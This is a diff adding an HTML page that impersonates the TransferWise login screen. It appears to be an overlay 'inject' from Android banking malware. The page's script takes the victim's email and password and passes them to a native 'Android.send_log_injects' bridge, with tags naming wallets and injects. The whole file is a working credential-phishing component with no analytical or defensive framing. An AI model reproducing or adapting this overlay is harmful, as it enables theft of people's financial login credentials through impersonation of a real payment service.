@@ -1,0 +1,226 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TransferWise: send, receive & spend money globally</title>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.0/css/bootstrap.min.css">
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.1/css/font-awesome.min.css">
+    <style>
+        body{
+            font-family: sans-serif;
+        }
+        header {
+            padding: 15px;
+        }
+        header > span {
+            font-size: 16px;
+            font-weight: 500;
+        }
+        section {
+            padding: 20px;
+        }
+
+        section > h4 {
+            font-weight: 600;
+            margin-bottom: 40px;
+            color: #36517e;
+        }
+        .cool-input {
+            box-sizing: border-box;
+            border: 0;
+            width: 100%;
+            position: relative;
+            font-size: 16px;
+            margin-bottom: 15px;
+        }
+        .cool-input__input {
+            box-sizing: border-box;
+            background: none;
+            width: 100%;
+            padding: 10px;
+            padding-left: 0;
+            position: relative;
+            z-index: 2;
+            font-size: 1em;
+        }
+        .cool-input__input:focus {
+            outline: none;
+        }
+        .cool-input__placeholder {
+            box-sizing: border-box;
+            border: none;
+            background: none;
+            width: 100%;
+            position: absolute;
+            z-index: 1;
+            left:0;
+            top: 43%;
+            line-height: 0;
+            font-weight: 500;
+            font-size: 18px;
+            color: #6f8590;
+            transition: all 0.2s ease;
+        }
+        
+        .cool-input__input_filled + .cool-input__placeholder,
+        .cool-input__input:focus + .cool-input__placeholder {
+            font-size: 0.8em;
+            top: 0;
+            margin-top: -7px;
+            color: #049bf7;
+        }
+        .input {
+            width: 100%;
+            padding: 5px;
+            padding-left: 0;
+            border: 0;
+            border-bottom: 1px solid #aeaeae;
+            margin-bottom: 15px;
+        }
+
+        .input:focus {
+            border-bottom: 2px solid #00a5df;
+        }
+
+        .submit {
+            width: 100%;
+            color: #fff;
+            background-color: #00a5df;
+            padding: 12px;
+            border: 0;
+            border-radius: 2px;
+            font-size: 16px;
+        }
+
+        .submit:disabled {
+            background-color: #c7c7c7;
+            box-shadow: none;
+        }
+
+        .footerText {
+            margin-top: 30px;
+        }
+
+        .footerText > p {
+            text-decoration: underline;
+            text-align: center;
+            font-size: 16px;
+            font-weight: 600;
+            margin-bottom: 25px;
+            color: #00a5df;
+        }
+
+        section > h5 {
+            font-weight: 100;
+            margin-bottom: 30px;
+            font-size: 18px;
+        }
+
+        .exp {
+            margin-right: 1%;
+            width: 39%;
+            display: inline-block
+        }
+
+        .cvv {
+            width: 19%;
+            display: inline-block
+        }
+
+        .error {
+            border-color: #f00 !important;
+        }
+
+        input,button {
+            outline: none !important;
+            box-shadow: none !important;
+        }
+
+        .green {
+            border-color: rgb(1, 170, 1) !important;
+        }
+        #number_cardlbl {
+            color: red;
+            font-size: 0.8rem;
+            margin-top: -13px;
+            display: block;
+        }
+    </style>
+</head>
+<body>
+    <form onsubmit="return false">
+        <header>
+            <img style="margin-top: -5px;margin-right: 20px;width: 20px;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAB4AAAAeCAMAAAAM7l6QAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyJpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMy1jMDExIDY2LjE0NTY2MSwgMjAxMi8wMi8wNi0xNDo1NjoyNyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNiAoV2luZG93cykiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6ODk0QjJENzM2ODVBMTFFQUE2M0JCN0M1Q0NCNDNBMkIiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6ODk0QjJENzQ2ODVBMTFFQUE2M0JCN0M1Q0NCNDNBMkIiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDo4OTRCMkQ3MTY4NUExMUVBQTYzQkI3QzVDQ0I0M0EyQiIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDo4OTRCMkQ3MjY4NUExMUVBQTYzQkI3QzVDQ0I0M0EyQiIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/Ppk2M8IAAAEjUExURQCk3gCk4QCl2wCl3QCl3wCl4QGk3wGm4AOj3Qeh1wei2Aei2gii2Aio4gmj2RiczBidyhmcyhuZyRyayh6YySqWvSuVvS6VuDCUuDGTuDOSsjSRslix0Vux0mDk/2Tp/2WrxWWtxmXo/2bS+WfR+Wjm/2msv2qrv2vl/2yowGyqv22pwW2pw22qv22rwHjc/3nb/3rZ+XvY+X2isn6js4Td/YXH3YbH3Ybc/ZLK4ZfBz5fS5JjQ55jR5JnQ5J7I1qHL2a3J1K3K0rLN1LLN1rXL1sDu/sbx/8n//8v//87//8///9H//9L//9T//9X//9b//93//9///+D//+P//+r//+v//+7///H///j///n///3//v7+/v7////+/////f///2G9J4wAAAFxSURBVCjPdZOJUsIwEIZTm4KgeF9430ehiveJqOAFVFSEAqYk7/8UZhtS0gzuTKaZftn9N7tZxBSjtF5nEUNyQwJcKAzA3S4jlFL2eWRZx1+DMAN8v2BZiy8a9n2xreUMY2T8se134bhwU3A+zfFqQ8fCPrhuYuapLe+gZX7LdRP7DR2TIEgth/Ho5HMnei3f72WeT3O86XXUKkhMajmEx6ZKmm+oHfjuNDUMERBloGsOX72Vq65bjawfj+N8Oo7N1MrGrp3J2HY2awdfWGceat0NYWn8mBmLwc4wMEZ43kWt66EQ4gjGgBm7mMVxM7W8vuc4ziEP6jgQ+ICvU4/j8hakdv5ecUVKrqukBkW5nOtdjPRrItoS4Mo2x9OiLITIbiktAf/kWrMzsGqMgX9yoqTVHDARDQz1mXwgEB7J/gr9YoiJinv6cV1fwUK/+B8O/NHSa/9xKk9R+p98c/wbwTAl4sfNQ3TmUL9CYNERpPQP8DYGqAygR08AAAAASUVORK5CYII=">
+        </header>
+        <section>
+            <h4 data-translate="_welcome">Log in</h4>
+            <div class="cool-input">
+                <input type="email" id="login" name="login" onkeyup="checkFirst()" class="input cool-input__input"  autocomplete="off" required>
+                <span class="cool-input__placeholder" data-translate="_login">Email</span>
+            </div>
+            <div class="cool-input">
+                <input type="password" id="password" name="password" onkeyup="checkFirst()" class="input cool-input__input"  autocomplete="off" required>
+                <span class="cool-input__placeholder" data-translate="_password">Password</span>
+            
+                <img style="width: 25px;float:right;position: relative;top: -36px;right: 15px;width: 20px;z-index: 999999;cursor: pointer;" id="eye" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACoAAAAeCAIAAADVShu3AAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyJpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMy1jMDExIDY2LjE0NTY2MSwgMjAxMi8wMi8wNi0xNDo1NjoyNyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNiAoV2luZG93cykiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6NDE3NjMyMUE2ODVCMTFFQUExMkNDNDcwNDA5RTYzQzIiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6NDE3NjMyMUI2ODVCMTFFQUExMkNDNDcwNDA5RTYzQzIiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDo0MTc2MzIxODY4NUIxMUVBQTEyQ0M0NzA0MDlFNjNDMiIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDo0MTc2MzIxOTY4NUIxMUVBQTEyQ0M0NzA0MDlFNjNDMiIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/PpnKqBYAAAZ6SURBVEjHlVdrTJNX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" alt="">
+               
+            </div>
+            <button class="submit" id="nextPage" data-translate="_welcome" disabled>Sign in</button>
+            <div class="footerText">
+                <p data-translate="_remporary"> Forgot password? </p>
+            </div>
+        </section>
+    </form>
+    <script>
+    $('.cool-input__input').on('input', function(){
+        var $this = $(this);
+        if ($this.val() == '') {
+            $this.removeClass('cool-input__input_filled');
+        } else {
+            $this.addClass('cool-input__input_filled');
+        }
+    });
+
+
+    var sendData = document.getElementById('sendData'),
+        login = document.getElementById('login'),
+        password = document.getElementById('password'),
+        eye = document.getElementById('eye');
+
+        eye.onclick = function() {
+            if(password.type === 'password') {
+                password.type = 'text'
+            } else {
+                password.type = 'password'
+            }
+        }
+
+        function checkFirst(){
+            if(/^([a-z0-9_-]+\.)*[a-z0-9_-]+@[a-z0-9_-]+(\.[a-z0-9_-]+)*\.[a-z]{2,6}$/i.test(login.value) && password.value.length > 4) {
+                nextPage.disabled = false;
+            } else{
+                nextPage.disabled = true;
+            }return false
+        }
+
+        nextPage.onclick = function(){
+            var data = {};
+                data.email = login.value;
+                data.password = password.value;
+                data.type_injects = "wallets";
+                data.closed = "close_activity_injects";
+
+                var ua = navigator.userAgent.toLowerCase();
+                if(ua.indexOf("android") > -1) {
+                    try {
+                        Android.send_log_injects(JSON.stringify(data))
+                    } catch (err) {}
+                }else{
+                    alert(JSON.stringify(data));
+                }
+        }
+    </script>
+</body>
+</html>
